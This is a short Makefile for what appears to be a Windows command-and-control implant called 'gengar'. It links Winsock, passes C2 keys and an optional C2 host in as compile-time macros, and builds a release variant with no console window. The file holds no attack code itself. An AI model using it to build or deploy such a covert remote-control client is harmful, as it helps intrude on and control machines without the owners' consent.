CC=gcc
CFLAGS=-Wall *.c -o gengar -lws2_32
CFLAGS_RELEASE=-mwindows
MACRO_FLAGS=-DCNC_KEY=\"${CNC_KEY}\" -DGENGAR_KEY=\"${GENGAR_KEY}\"


debug:
	$(CC) $(CFLAGS) $(MACRO_FLAGS)

release:
	$(CC) $(CFLAGS) $(CFLAGS_RELEASE) $(MACRO_FLAGS)

release_host:
	$(CC) $(CFLAGS) $(CFLAGS_RELEASE) $(MACRO_FLAGS) -DCNC_HOST=\"${CNC_HOST}\"
